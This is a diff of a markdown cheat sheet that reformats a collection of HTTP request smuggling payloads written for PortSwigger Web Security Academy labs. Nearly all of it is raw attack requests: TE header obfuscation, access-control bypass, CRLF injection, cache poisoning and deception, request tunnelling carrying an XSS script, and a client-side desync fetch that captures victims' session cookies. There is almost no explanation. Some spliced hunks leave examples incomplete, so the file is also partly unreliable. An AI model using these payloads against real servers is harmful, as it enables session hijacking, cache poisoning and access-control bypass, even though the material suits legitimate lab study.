@@ -1,4 +1,12 @@
-DOM xss via http r s
+### Exploiting HTTP Request Manipulations
+
+**DOM XSS via HTTP Request Smuggling**
+
+HTTP Request Smuggling is a technique where a malicious payload can be inserted into the HTTP request to exploit potential vulnerabilities. Here are various examples and techniques related to this attack:
+
+**Example 1 - Basic Request Smuggling:**
+
+```http
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -13,39 +21,15 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
 x=1
+```
 
-CL.TE
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 6
-Transfer-Encoding: chunked
+**Example 2 - Obfuscating TE Header:**
 
-0
-
-G
-
-TE.CL
+```http
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-length: 4
-Transfer-Encoding: chunked
-
-5c
-GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
-0
-
-Obfuscating TE header
-POST / HTTP/1.1
-Host: YOUR-LAB-ID.web-security-academy.net
-Content-Type: application/x-www-form-urlencoded
-Content-length: 4
+Content-Length: 4
 Transfer-Encoding: chunked
 Transfer-encoding: cow
 
@@ -56,8 +40,11 @@ Content-Length: 15
 
 x=1
 0
+```
 
-Exploiting to bypass access controls
+**Example 3 - Exploiting to Bypass Access Controls:**
+
+```http
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -72,19 +59,11 @@ Content-Length: 400
 Cookie: session=your-session-token
 
 csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
 
-H2.CL
-POST / HTTP/2
-Host: YOUR-LAB-ID.web-security-academy.net
-Content-Length: 0
+**Example 4 - Via CRLF:**
 
-GET /resources[replace by ur server] HTTP/1.1
-Host: foo
-Content-Length: 5
-
-x=1
-
-via CRLF
+```http
 0
 
 POST / HTTP/1.1
@@ -93,8 +72,11 @@ Cookie: session=YOUR-SESSION-COOKIE
 Content-Length: 800
 
 search=x
+```
 
-Cache poisoning
+**Example 5 - Cache Poisoning:**
+
+```http
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -109,8 +91,11 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
 x=1
+```
 
-Cache deception
+**Example 6 - Cache Deception:**
+
+```http
 POST / HTTP/1.1
 Host: YOUR-LAB-ID.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -125,15 +110,21 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 10
 
 x=1
+```
 
-Via request tunneling
+**Example 7 - Via Request Tunneling:**
+
+```http
 /?cachebuster=3 HTTP/1.1\r\n
 Host: YOUR-LAB-ID.web-security-academy.net\r\n
 \r\n
 GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
 Foo: bar
+```
 
-Client side desync
+**Example 8 - Client-Side Desynchronization:**
+
+```javascript
 fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
         method: 'POST',
         body: 'POST /en/post/comment HTTP/1.1\r\nHost: YOUR-LAB-ID.h1-web-security-academy.net\r\nCookie: session=YOUR-SESSION-COOKIE; _lab_analytics=YOUR-LAB-COOKIE\r\nContent-Length: NUMBER-OF-BYTES-TO-CAPTURE\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://portswigger.net&comment=',
@@ -145,4 +136,6 @@ fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
         credentials: 'include'
     })
 })
+```
 
+HTTP Request Smuggling techniques can have a significant impact on security. Proper request handling and security measures are essential to prevent these types of vulnerabilities.
